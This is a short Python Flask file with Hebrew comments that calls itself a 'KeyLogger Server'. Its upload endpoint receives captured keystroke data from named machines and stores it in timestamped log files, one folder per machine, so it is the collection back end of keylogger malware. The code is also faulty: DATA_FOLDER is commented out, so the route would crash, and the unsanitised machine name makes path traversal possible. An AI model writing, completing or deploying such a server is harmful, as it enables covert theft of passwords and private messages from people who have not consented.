#סקיצה ראשונית
from flask import request
import time
from flask import Flask, jsonify
import os
# DATA_FOLDER = ""
app = Flask(__name__)
@app.route('/')
def home():
 return "KeyLogger Server is Running"
def generate_log_filename():
    # מחזירה שם קובץ המבוסס על חותמת זמן #
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()

    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    machine = data["machine"]
    log_data = data["data"]

    #יצירת תיקייה עבור המכשיר אם אינה קיימת
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)
    # יצירת שם קובץ חדש לפי חותמת זמן #
    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    # ניתן להוסיף כאן עיבוד נוסף, למשל הוספת חותמת זמן נוספת בתוך הקובץ #
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200
if __name__ == '__main__':
 app.run(debug=True)


